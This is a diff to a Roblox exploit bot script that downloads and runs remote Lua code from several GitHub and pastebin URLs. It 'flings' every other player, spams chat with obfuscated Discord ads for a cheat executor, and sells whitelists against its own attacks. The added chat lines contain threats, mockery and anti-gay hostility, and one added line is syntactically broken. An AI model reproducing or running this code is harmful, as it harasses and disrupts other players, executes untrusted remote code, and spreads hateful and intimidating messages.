@@ -15,6 +15,7 @@ if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 wait(2)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/tEMMIE6823/Scripts/main/Anti%20chat.txt'),true))()
 if game.Players.LocalPlayer.UserId == 4170058160 then wait(9e9) elseif game.Players.LocalPlayer.UserId == 4210396650 then wait(9e9) elseif game.Players.LocalPlayer.UserId == 839916604 then wait(9e9) else do
     local WS = game.Workspace
     local PLR = game.Players
@@ -32,7 +33,7 @@ script=loadstring(game:HttpGet("https://pastebin.com/raw/XXPTpkcZ", true))()
         game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
     end
     loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/CoolEpikSwagger/fates-admin-but-without-shitty-api-limits-because-they-support-gay-rights/main/main.lua"))() -- fates admin without the shitty limit
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/tEMMIE6823/fates-admin-but-without-shitty-api-limits-cuz-they-support-the-gays-wtf/main/main.lua"))() -- fates admin without the shitty limit
     for _,v in pairs(workspace:GetDescendants()) do
         if v.ClassName == "Part"
             or v.ClassName == "SpawnLocation"
@@ -62,7 +63,7 @@ script=loadstring(game:HttpGet("https://pastebin.com/raw/XXPTpkcZ", true))()
     workspace.FallenPartsDestroyHeight = 0/0
     
     wait(4)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/CoolEpikSwagger/Hex-Compiled/main/ban.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/tEMMIE6823/Scripts/main/ban.lua"))()
     local hasChecked = false
     local BLCheck = false
     local FRCheck = false
@@ -80,22 +81,21 @@ script=loadstring(game:HttpGet("https://pastebin.com/raw/XXPTpkcZ", true))()
     end
 -- list of shit to say, knock urself out and change up the shit
 Thingers = {
-'[:X>nc:] Bored of normal executors? Try X>nc! We are open source & We Bypass Byfron! We are better than KRNL: || d sc . gg/BW sc V PAWM Q (Reporting the bot is useless)',
-'[:X>nc:] Need an Executor with No keys, No ads? Try X>nc! We Bypass Byfron & We are Open Source for FREE! || d sc . gg/BW sc V PAWM Q(Reporting the bot is useless)',
-'[:X>nc:] Ever wanted an executor with NO Limits, NO Advertisments and NO KEYS Whilst being ENTIRELY FREE? Try X>nc, We are open source || d sc . gg/BW sc V PAWM Q',
-'[:X>nc:] These kids are so mad that they are using bots to try spread misinformation abt X>nc LOOL talk abt jealous || d sc . gg/BW sc V PAWM Q',
-'[:X>nc:] RRRAAHHHHHHHHH 👶👶👶👶 || d sc . gg/BW sc V PAWM Q',
-'[:X>nc:] BOUBSIES❗❗❗❗ || d sc . gg/BW sc V PAWM Q',
+'[:X>nc:] Mad? Good! Join our server or we will launch more bots into the server kek: || d sc . gg/k pg PG qmj By ',
+'[:X>nc:] OmG bEcAuSe i hAte Em i mUsT tHiNk Im sIgMa! - said no one ever || d sc . gg/k pg PG qmj By ,
+'[:X>nc:] Ever wanted an executor with NO Limits, NO Advertisments and NO KEYS Whilst being ENTIRELY FREE? Try X>nc, We are open source || d sc . gg/k pg PG qmj By',
+'[:X>nc:] These kids are so mad that they are using threats to try make us stop LOL || d sc . gg/k pg PG qmj By',
+'[:X>nc:] RRRAAHHHHHHHHH 👶👶👶👶 || d sc . gg/k pg PG qmj By',
+'[:X>nc:] BOUBSIES❗❗❗❗ || d sc . gg/k pg PG qmj By',
 '[:X>nc:] Want to not get flung by the bots? Want the bots to not attack you? Want them yo serverhop the second it detects you? Purchase a whitelist!',
-'[:X>nc:] Uncle ben what happened to you 😭😭😭😭😭 || d sc . gg/BW sc V PAWM Q',
-'[:X>nc:] Green M&M Wussy 💀💀💀💀💀💀💀💀 || d sc . gg/BW sc V PAWM Q',
-'[:X>nc:] If you dont trust us use virus total, We are safe || d sc . gg/BW sc V PAWM Q',
-'[:X>nc:] If you dont trust us use virus total, We are safe || d sc . gg/BW sc V PAWM Q'
+'[:X>nc:] Uncle ben what happened to you 😭😭😭😭😭 || d sc . gg/k pg PG qmj By',
+'[:X>nc:] Green M&M Wussy 💀💀💀💀💀💀💀💀 || d sc . gg/k pg PG qmj By',
+'[:X>nc:] Dont believe these idiots, They are trying to push a new world order onto you LOL 🌈❌🌈❌',
 }
 
-    cht("!loop fling all")
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/loop%20fling%20all'),true))()
     cht("!disablesit")
-
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/tEMMIE6823/Scripts/main/CPUSaver.lua'),true))()
     local camera = game.Workspace.CurrentCamera
     camera.CameraType = Enum.CameraType.Scriptable
     camera.CFrame = CFrame.new(20000, -20000, 20000)
